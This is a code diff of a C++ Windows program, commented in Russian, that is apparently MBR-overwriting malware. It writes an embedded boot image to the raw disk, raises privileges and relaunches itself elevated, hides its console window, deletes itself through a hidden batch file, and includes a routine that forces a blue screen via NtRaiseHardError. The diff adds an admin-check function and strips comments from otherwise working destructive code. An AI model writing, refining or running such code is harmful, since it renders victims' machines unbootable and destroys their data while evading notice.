@@ -9,13 +9,27 @@
 
 const char MBR_HEX[] = "{MBR_DATA}";
 
-// === ВЫЗОВ BSOD (упрощённый, без сложных типов) ===
+// === ПРОВЕРКА ПРАВ АДМИНИСТРАТОРА (СВОЯ ФУНКЦИЯ) ===
+bool IsAdmin() {
+    BOOL isAdmin = FALSE;
+    PSID adminGroup = NULL;
+    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
+    
+    if (AllocateAndInitializeSid(&ntAuthority, 2, 
+        SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
+        0, 0, 0, 0, 0, 0, &adminGroup)) {
+        CheckTokenMembership(NULL, adminGroup, &isAdmin);
+        FreeSid(adminGroup);
+    }
+    
+    return isAdmin == TRUE;
+}
+
+// === ВЫЗОВ BSOD ===
 void TriggerBSOD() {
-    // Получаем ntdll.dll
     HMODULE ntdll = GetModuleHandleA("ntdll.dll");
     if (!ntdll) return;
     
-    // NtRaiseHardError через GetProcAddress
     typedef NTSTATUS (NTAPI *NtRaiseHardError_t)(
         NTSTATUS ErrorStatus,
         ULONG NumberOfParameters,
@@ -28,17 +42,15 @@ void TriggerBSOD() {
     NtRaiseHardError_t NtRaiseHardError = (NtRaiseHardError_t)GetProcAddress(ntdll, "NtRaiseHardError");
     if (!NtRaiseHardError) return;
     
-    // Параметры для BSOD
     ULONG_PTR params[4] = {0};
     ULONG response = 0;
     
-    // Вызываем синий экран с кодом CRITICAL_PROCESS_DIED
     NtRaiseHardError(
-        0xC000021A,  // STATUS_SYSTEM_PROCESS_TERMINATED
-        1,           // 1 параметр
-        0,           // Нет строковых параметров
-        params,      // Параметры
-        6,           // OptionShutdownSystem
+        0xC000021A,
+        1,
+        0,
+        params,
+        6,
         &response
     );
 }
@@ -74,7 +86,7 @@ void WriteMBR() {
     
     if (image.size() < 512) return;
     
-    // Отключаем проверки целостности Windows
+    // Повышаем привилегии
     HANDLE hToken;
     TOKEN_PRIVILEGES tkp;
     OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
@@ -111,7 +123,6 @@ void WriteMBR() {
         if (hDisk == INVALID_HANDLE_VALUE) return;
     }
     
-    // Записываем образ (MBR + Stage2)
     DWORD bytesWritten;
     WriteFile(hDisk, image.data(), (DWORD)image.size(), &bytesWritten, NULL);
     CloseHandle(hDisk);
@@ -120,7 +131,6 @@ void WriteMBR() {
     char szPath[MAX_PATH] = {0};
     GetModuleFileNameA(NULL, szPath, MAX_PATH);
     
-    // Создаём bat-файл для удаления (используем char, а не wchar_t)
     std::string batPath = std::string(szPath) + ".bat";
     std::ofstream bat(batPath.c_str());
     bat << "@echo off\n";
@@ -129,7 +139,6 @@ void WriteMBR() {
     bat << "del \"" << batPath << "\"\n";
     bat.close();
     
-    // Запускаем bat скрыто
     STARTUPINFOA si = {0};
     PROCESS_INFORMATION pi = {0};
     si.cb = sizeof(si);
@@ -147,13 +156,11 @@ void WriteMBR() {
 
 // === ТОЧКА ВХОДА ===
 int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmdLine, int nShow) {
-    // Если не админ — запрашиваем права
-    if (!IsUserAnAdmin()) {
+    if (!IsAdmin()) {
         ElevateAndRun();
         return 0;
     }
     
-    // Скрываем окно консоли
     ShowWindow(GetConsoleWindow(), SW_HIDE);
     
     WriteMBR();
